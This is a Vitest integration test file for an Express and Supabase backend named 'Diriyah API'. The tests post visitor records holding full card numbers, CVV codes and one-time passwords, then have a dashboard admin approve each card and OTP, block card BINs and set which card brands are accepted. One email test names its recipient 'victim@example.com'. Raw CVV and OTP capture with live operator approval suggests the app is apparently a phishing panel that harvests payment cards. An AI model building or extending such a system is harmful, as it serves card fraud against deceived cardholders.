import { describe, expect, it, vi } from "vitest";
import express from "express";
import { createServer } from "node:http";

const fake = vi.hoisted(() => {
  const rows = new Map<string, { id: string; data: any }>();
  const key = (table: string, id: string) => `${table}:${id}`;
  const from = (table: string) => {
    const query: any = {
      select: () => query,
      eq: (_column: string, id: string) => {
        query.id = id;
        return query;
      },
      maybeSingle: async () => ({
        data: query.id ? rows.get(key(table, query.id)) ?? null : null,
        error: null,
      }),
      limit: async () => ({ data: [], error: null }),
      upsert: async (row: { id: string; data: any }) => {
        rows.set(key(table, row.id), row);
        return { error: null };
      },
      delete: () => query,
      then: (resolve: (value: any) => void) => {
        resolve({
          data: Array.from(rows.values()).filter((row) => key(table, row.id).startsWith(`${table}:`)),
          error: null,
        });
      },
    };
    return query;
  };
  return {
    from,
    auth: {
      signInWithPassword: vi.fn(),
      getUser: vi.fn(),
    },
  };
});

vi.mock("./supabase", () => ({ serverSupabase: fake }));

import { registerRoutes } from "./routes";

describe("Diriyah API integration", () => {
  it("creates an HTTP-only dashboard session cookie after Supabase Auth succeeds", async () => {
    fake.auth.signInWithPassword.mockResolvedValueOnce({
      data: {
        session: { access_token: "test-access-token" },
        user: { id: "auth-user", email: "admin@example.com", app_metadata: { role: "admin" } },
      },
      error: null,
    });
    const app = express();
    app.use(express.json());
    const server = createServer(app);
    await registerRoutes(server, app);
    await new Promise<void>((resolve) => server.listen(0, resolve));
    const address = server.address();
    const port = typeof address === "object" && address ? address.port : 0;
    const response = await fetch(`http://127.0.0.1:${port}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "admin@example.com", password: "not-asserted" }),
    });
    expect(response.status).toBe(200);
    expect(response.headers.get("set-cookie")).toContain("sb-access-token=test-access-token");
    expect(response.headers.get("set-cookie")).toContain("HttpOnly");
    server.close();
  });

  it("supports visitor loading, approvals, BIN blocking, and card settings through server routes", async () => {
    fake.auth.getUser.mockResolvedValue({
      data: { user: { id: "auth-user", email: "admin@example.com", app_metadata: { role: "admin" } } },
      error: null,
    });
    const app = express();
    app.use(express.json());
    const server = createServer(app);
    await registerRoutes(server, app);
    await new Promise<void>((resolve) => server.listen(0, resolve));
    const address = server.address();
    const port = typeof address === "object" && address ? address.port : 0;
    const base = `http://127.0.0.1:${port}`;
    const adminHeaders = {
      "content-type": "application/json",
      cookie: "sb-access-token=test-access-token",
    };

    const visitorId = "visitor_123e4567-e89b-12d3-a456-426614174000";
    const create = await fetch(`${base}/api/db/pays/${visitorId}`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        payload: {
          currentPage: "checkout",
          cardNumber: "4111111111111111",
          c1: "5555555555554444",
          cvv: "123",
          cpc: "456",
          otp: "654321",
          payment: {
            c1: "4000000000000002",
            cvc: "789",
            otpCode: "123456",
            status: "pending",
          },
        },
        merge: false,
      }),
    });
    expect(create.status).toBe(200);
    const bookingCookie = create.headers.get("set-cookie")?.split(";")[0] || "";
    expect(bookingCookie).toContain("booking-capability=");

    const visitors = await fetch(`${base}/api/db/pays/`, {
      headers: { cookie: "sb-access-token=test-access-token" },
    });
    expect(visitors.status).toBe(200);
    expect((await visitors.json()).data).toHaveLength(1);

    const approval = await fetch(`${base}/api/db/pays/${visitorId}`, {
      method: "POST",
      headers: adminHeaders,
      body: JSON.stringify({
        payload: {
          cardApprovalStatus: "approved",
          cardApproved: true,
          cardStatus: "approved",
          status: "approved",
          otpApprovalStatus: "approved",
          otpApproved: true,
          otpStatus: "approved",
        },
        merge: true,
      }),
    });
    expect(approval.status).toBe(200);

    const blockBin = await fetch(`${base}/api/db/blocked_bins/411111`, {
      method: "POST",
      headers: adminHeaders,
      body: JSON.stringify({ payload: { bin: "411111" }, merge: false }),
    });
    expect(blockBin.status).toBe(200);

    const cardSettings = await fetch(`${base}/api/db/settings/card-settings`, {
      method: "POST",
      headers: adminHeaders,
      body: JSON.stringify({ payload: { visa: true, mada: false }, merge: false }),
    });
    expect(cardSettings.status).toBe(200);

    const denied = await fetch(`${base}/api/db/pays/${visitorId}`);
    expect(denied.status).toBe(200);

    const saved = await fetch(`${base}/api/db/pays/${visitorId}`, {
      headers: { cookie: bookingCookie },
    });
    const savedData = (await saved.json()).data;
    expect(savedData).toMatchObject({
      currentPage: "checkout",
      cardApprovalStatus: "approved",
      cardApproved: true,
      cardStatus: "approved",
      status: "approved",
      otpApprovalStatus: "approved",
      otpApproved: true,
      otpStatus: "approved",
    });
    expect(savedData.cardStatus).toBe("approved");

    const settings = await fetch(`${base}/api/db/settings/`, {
      headers: { cookie: "sb-access-token=test-access-token" },
    });
    expect(settings.status).toBe(200);
    expect((await settings.json()).data).toEqual(expect.arrayContaining([expect.objectContaining({ id: "card-settings" })]));
    server.close();
  });

  it("rejects unauthenticated dashboard data access and email sending", async () => {
    const app = express();
    app.use(express.json());
    const server = createServer(app);
    await registerRoutes(server, app);
    await new Promise<void>((resolve) => server.listen(0, resolve));
    const address = server.address();
    const port = typeof address === "object" && address ? address.port : 0;
    const base = `http://127.0.0.1:${port}`;

    const list = await fetch(`${base}/api/db/pays`);
    expect(list.status).toBe(401);

    const mutateSettings = await fetch(`${base}/api/db/settings/card-settings`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ payload: { visa: false }, merge: true }),
    });
    expect(mutateSettings.status).toBe(401);

    const email = await fetch(`${base}/api/send-confirmation-email`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ to: "victim@example.com", subject: "test", text: "test" }),
    });
    expect(email.status).toBe(401);

    server.close();
  });
});
